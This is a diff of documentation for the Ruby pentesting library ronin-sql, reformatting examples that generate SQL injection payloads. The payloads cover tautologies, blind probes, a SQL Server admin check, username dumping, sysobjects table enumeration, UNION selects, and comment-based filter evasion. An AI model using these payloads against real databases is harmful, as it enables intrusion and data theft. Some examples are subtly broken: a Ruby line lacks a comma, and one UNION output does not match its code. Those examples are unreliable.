@@ -17,72 +17,96 @@ of being able to recreate most of the examples from
 
 Load `ronin-sql`:
 
-    require 'ronin/code/sql' 
-    include Ronin
+{% highlight ruby %}
+require 'ronin/code/sql' 
+include Ronin
 
-    sql = Code.sql
+sql = Code.sql
+{% endhighlight %}
 
 Normal SQL Injection:
 
-    sql[1, :or, 1, :eq, 1].to_s
-    # => "1 or 1 = 1"
+{% highlight ruby %}
+sql[1, :or, 1, :eq, 1].to_s
+# => "1 or 1 = 1"
+{% endhighlight %}
 
 Normal SQL Injection using encapsulated data:
 
-    sql['1', :or '1', :eq, '1'].to_s
-    # => "'1' or '1' = '1'"
+{% highlight ruby %}
+sql['1', :or '1', :eq, '1'].to_s
+# => "'1' or '1' = '1'"
+{% endhighlight %}
 
 Blind SQL Injection creating an error using EXEC:
 
-    sql[1, :exec, :sp_, [sql[:or, :exec, :xp_]]].to_s
-    # => "1 exec sp_ (or exec xp_)"
+{% highlight ruby %}
+sql[1, :exec, :sp_, [sql[:or, :exec, :xp_]]].to_s
+# => "1 exec sp_ (or exec xp_)"
+{% endhighlight %}
 
 Blind SQL Injection detection:
 
-    sql[1, :and, 1, :eq, 1].to_s
-    # => "1 and 1 = 1"
+{% highlight ruby %}
+sql[1, :and, 1, :eq, 1].to_s
+# => "1 and 1 = 1"
+{% endhighlight %}
 
 Blind SQL Injection to attempt to locate tablenames by brute-force
 iteration through potential names:
 
-    sql['1', :and, 1, :eq, [sql[:select, sql.count(:all), :from, :tablenames]]].to_s
-    # => "'1' and 1 = (select count(*) from tablenames)"
+{% highlight ruby %}
+sql['1', :and, 1, :eq, [sql[:select, sql.count(:all), :from, :tablenames]]].to_s
+# => "'1' and 1 = (select count(*) from tablenames)"
+{% endhighlight %}
 
 Using the `USER_NAME()` function in SQL Server to tell us if the user is
 running as the administrator:
 
-    sql[1, :and, sql.user_name(), :eq, 'dbo'].to_s
-    # => "1 and user_name() = 'dbo'"
+{% highlight ruby %}
+sql[1, :and, sql.user_name(), :eq, 'dbo'].to_s
+# => "1 and user_name() = 'dbo'"
+{% endhighlight %}
 
 Creating errors by calling fake tables:
 
-    sql[1, :and, :non_existant_table, :eq, '1'].to_s
-    # => "1 and non_existant_table = '1'"
+{% highlight ruby %}
+sql[1, :and, :non_existant_table, :eq, '1'].to_s
+# => "1 and non_existant_table = '1'"
+{% endhighlight %}
 
 Dumping usernames:
 
-    sql[:or, :username, :is, :not, nil, :or, :username, :eq].to_s
-    # => "or username is not null or username ="
+{% highlight ruby %}
+sql[:or, :username, :is, :not, nil, :or, :username, :eq].to_s
+# => "or username is not null or username ="
+{% endhighlight %}
 
 Enumerating through database table names:
 
-    sql[1, :and, sql.ascii(sql.lower(sql.substring( [sql[:select, :top, 1, :name, :from, :sysObjects, :where, :xtype, :eq, 'U']], 1, 1))), :gt, 116].to_s
-    # => "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype = 'U'),1,1))) > 116"
+{% highlight ruby %}
+sql[1, :and, sql.ascii(sql.lower(sql.substring( [sql[:select, :top, 1, :name, :from, :sysObjects, :where, :xtype, :eq, 'U']], 1, 1))), :gt, 116].to_s
+# => "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype = 'U'),1,1))) > 116"
+{% endhighlight %}
 
 Finding user supplied tables using the sysObjects table in SQL Server:
 
-    sql[1, :union, :all, :select, [1,2,3,4,5,6,:name], :from, :sysObjects, :where, :xtype, :eq, 'U'].to_s
-    # => "1 union * select (1,2,3,4,5,6,name) from sysObjects where xtype = 'U'"
+{% highlight ruby %}
+sql[1, :union, :all, :select, [1,2,3,4,5,6,:name], :from, :sysObjects, :where, :xtype, :eq, 'U'].to_s
+# => "1 union * select (1,2,3,4,5,6,name) from sysObjects where xtype = 'U'"
+{% endhighlight %}
 
 Bypassing filter evasion using comment tags:
 
-    stmt = sql[1, :union, :select, :all, :from, :where]
-    stmt.to_s
-    # => "1 union select * from where"
+{% highlight ruby %}
+stmt = sql[1, :union, :select, :all, :from, :where]
+stmt.to_s
+# => "1 union select * from where"
 
-    stmt.spaces = false
-    stmt.to_s
-    # => "1/**/union/**/select/**/*/**/from/**/where"
+stmt.spaces = false
+stmt.to_s
+# => "1/**/union/**/select/**/*/**/from/**/where"
+{% endhighlight %}
 
 <div class="note">
   <p>
